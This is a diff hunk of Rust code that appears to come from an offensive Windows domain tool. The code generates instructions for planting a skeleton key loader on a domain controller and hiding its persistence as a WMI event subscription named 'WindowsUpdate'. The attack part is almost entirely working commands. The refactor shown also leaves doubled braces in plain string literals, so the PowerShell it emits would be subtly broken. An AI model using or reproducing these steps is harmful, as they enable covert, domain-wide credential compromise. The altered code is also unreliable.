@@ -883,15 +883,9 @@ Write-Host "[+] Skeleton key deployed via PowerShell reflection"
                 "# 1. Copy skeleton key loader to DC:\n copy skloader.exe \\\\{}\\admin$\\system32\\skloader.exe",
                 self.config.target_dc
             ),
-            format!(
-                "# 2. Create WMI event filter:\n $filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{ Name='WindowsUpdate'; EventNamespace='root\\cimv2'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\"'; QueryLanguage='WQL' }}"
-            ),
-            format!(
-                "# 3. Create WMI command line consumer:\n $consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{ Name='WindowsUpdate'; CommandLineTemplate='C:\\Windows\\System32\\skloader.exe'; RunInteractively='false' }}"
-            ),
-            format!(
-                "# 4. Bind filter to consumer:\n Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{ Filter=$filter; Consumer=$consumer }}"
-            ),
+            "# 2. Create WMI event filter:\n $filter = Set-WmiInstance -Namespace root\\subscription -Class __EventFilter -Arguments @{{ Name='WindowsUpdate'; EventNamespace='root\\cimv2'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \"Win32_PerfFormattedData_PerfOS_System\"'; QueryLanguage='WQL' }}".to_string(),
+            "# 3. Create WMI command line consumer:\n $consumer = Set-WmiInstance -Namespace root\\subscription -Class CommandLineEventConsumer -Arguments @{{ Name='WindowsUpdate'; CommandLineTemplate='C:\\Windows\\System32\\skloader.exe'; RunInteractively='false' }}".to_string(),
+            "# 4. Bind filter to consumer:\n Set-WmiInstance -Namespace root\\subscription -Class __FilterToConsumerBinding -Arguments @{{ Filter=$filter; Consumer=$consumer }}".to_string(),
             format!(
                 "# 5. Verify: Master password is '{}'",
                 self.config.master_password
